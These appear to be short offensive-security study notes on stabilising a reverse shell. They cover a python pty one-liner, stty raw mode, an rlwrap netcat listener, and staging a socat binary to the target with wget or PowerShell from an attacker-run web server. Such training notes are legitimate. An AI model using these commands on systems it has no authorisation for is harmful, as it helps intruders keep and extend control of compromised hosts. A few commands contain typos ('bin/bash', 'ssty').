
## option A
After receiving reversed shell you can stabalize the shell if python is installed


Mind you, you may need to specify the python version

#### 3 steps
Launch bash shell:
`python -c 'import pty;pty.spawn("bin/bash")'`

backout the shell with ctr-z, setup xterm commands: 
`export TERM=xterm`

output the shell to echo raw, and bring it back to the foreground:
`stty raw -echo; fg `

Note: If the shell dies your input/output on that shell won't work anymore, type `reset` and press `[enter]`.


## Option B
### rlwrap

Specialy usefull for windows machines

`sudo apt install rlwrap`

`rlwrap nc -lnvp <port>`

Also this shell can be completely stabalized by disabling the output
`ssty raw -echo; fg`

### Option C 
Socat, 

This technique is limited to Linux targets, as a Socat shell on Windows will be no more stable than a netcat shell. 

To accomplish this method of stabilisation we would first transfer a socat static compiled binary (a version of the program compiled to have no dependencies) up to the target machine. A typical way to achieve this would be using a webserver on the attacking machine inside the directory containing your socat binary 
`sudo python3 -m http.server 80`, then, on the target machine, using the netcat shell to download the file. On Linux this would be accomplished with curl or wget 
`wget <LOCAL-IP>/socat -O /tmp/socat`.

For the sake of completeness: in a Windows CLI environment the same can be done with Powershell, using either Invoke-WebRequest or a webrequest system class, depending on the version of Powershell installed `Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe`. We will cover the syntax for sending and receiving shells with Socat in the upcoming tasks. 



